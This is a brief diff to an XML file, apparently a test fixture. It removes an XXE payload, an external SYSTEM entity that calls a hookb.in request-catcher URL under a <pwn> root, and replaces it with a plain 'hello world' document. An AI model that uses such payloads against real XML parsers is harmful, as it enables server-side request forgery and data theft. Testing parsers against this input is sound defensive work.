@@ -1,5 +1,4 @@
-<?xml version="1.0"?>
-<!DOCTYPE XXE [
-<!ENTITY test SYSTEM "https://hookb.in/RZ1gl9eYwptNb9zzbmVD">
-]>
-<pwn>test;</pwn>
+<?xml version="1.0" encoding="UTF-8"?>
+<text>
+  <para>hello world</para>
+</text>
